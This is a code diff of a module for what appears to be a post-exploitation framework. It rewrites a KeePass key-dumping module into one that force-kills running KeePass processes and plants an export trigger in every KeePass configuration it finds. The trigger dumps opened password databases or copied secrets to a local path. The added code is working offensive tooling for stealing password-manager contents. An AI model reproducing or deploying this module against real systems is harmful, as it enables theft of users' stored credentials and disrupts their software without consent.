@@ -7,13 +7,13 @@ class Module:
         # metadata info about the module, not modified during runtime
         self.info = {
             # name for the module that will appear in module menus
-            'Name': 'Invoke-KeeThief',
+            'Name': 'Add-KeePassConfigTrigger',
 
             # list of one or more authors for the module
             'Author': ['@tifkin_', '@harmj0y'],
 
             # more verbose multi-line description of the module
-            'Description': ('This module retrieves database mastey key information for unlocked KeePass database.'),
+            'Description': ('This module adds a KeePass exfiltration trigger to all KeePass configs found by Find-KeePassConfig.'),
 
             # True if the module needs to run in the background
             'Background' : True,
@@ -25,7 +25,7 @@ class Module:
             'NeedsAdmin' : False,
 
             # True if the method doesn't touch disk/is reasonably opsec safe
-            'OpsecSafe' : True,
+            'OpsecSafe' : False,
 
             # The minimum PowerShell version needed for the module to run
             'MinPSVersion' : '2',
@@ -45,6 +45,21 @@ class Module:
                 'Description'   :   'Agent to run the module on.',
                 'Required'      :   True,
                 'Value'         :   ''
+            },
+            'Action' : {
+                'Description'   :   "'ExportDatabase' (export opened databases to $ExportPath) or 'ExfilDataCopied' (export copied data to $ExportPath).",
+                'Required'      :   True,
+                'Value'         :   'ExportDatabase'
+            },
+            'ExportPath' : {
+                'Description'   :   "The path to export data to, defaults to %APPDATA%\\KeePass\\",
+                'Required'      :   False,
+                'Value'         :   ''
+            },
+            'TriggerName' : {
+                'Description'   :   "The name for the trigger.",
+                'Required'      :   True,
+                'Value'         :   'Debug'
             }
         }
 
@@ -69,7 +84,7 @@ class Module:
         moduleName = self.info["Name"]
 
         # read in the common powerview.ps1 module source code
-        moduleSource = self.mainMenu.installPath + "/data/module_source/collection/vaults/KeeThief.ps1"
+        moduleSource = self.mainMenu.installPath + "/data/module_source/collection/vaults/KeePassConfig.ps1"
 
         try:
             f = open(moduleSource, 'r')
@@ -83,8 +98,21 @@ class Module:
         # get just the code needed for the specified function
         script = moduleCode
 
-        script += "\nGet-KeePassDatabaseKey "
+        # kill all KeePass instances first
+        script += "\nGet-Process *keepass* | Stop-Process -Force"
 
+        script += "\nFind-KeePassconfig | Add-KeePassConfigTrigger "
+
+        for option, values in self.options.iteritems():
+            if option.lower() != "agent":
+                if values['Value'] and values['Value'] != '':
+                    if values['Value'].lower() == "true":
+                        # if we're just adding a switch
+                        script += " -" + str(option)
+                    else:
+                        script += " -" + str(option) + " " + str(values['Value'])
+
+        script += "\nFind-KeePassconfig | Get-KeePassConfigTrigger "
         script += ' | Format-List | Out-String | %{$_ + \"`n\"};"`n'+str(moduleName)+' completed!"'
 
         return script
